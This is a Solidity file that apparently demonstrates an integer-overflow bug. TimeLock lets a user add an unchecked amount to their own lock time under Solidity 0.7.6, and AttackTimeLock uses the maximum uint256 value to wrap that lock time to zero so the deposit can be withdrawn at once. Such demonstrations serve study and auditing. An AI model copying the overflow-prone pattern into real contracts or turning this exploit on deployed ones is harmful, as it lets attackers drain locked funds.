// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Falid to send Ether");
    }

    function getContractAddress() public view returns (address) {
        return address(this);
    }
}

contract AttackTimeLock {
    TimeLock timeLock;
    address payable owner;
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(TimeLock _timeLock) public {
        timeLock = TimeLock(_timeLock);
        owner = msg.sender;
    }

    fallback() external payable {
        // owner.transfer(address(this).balance);
    }

    //or

    function transferContractBalance() public payable onlyOwner {
        owner.transfer(address(this).balance);
    }

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        timeLock.increaseLockTime(
            type(uint256).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getBigNumber() public view returns (uint256) {
        return type(uint256).max - timeLock.lockTime(address(this));
    }
}
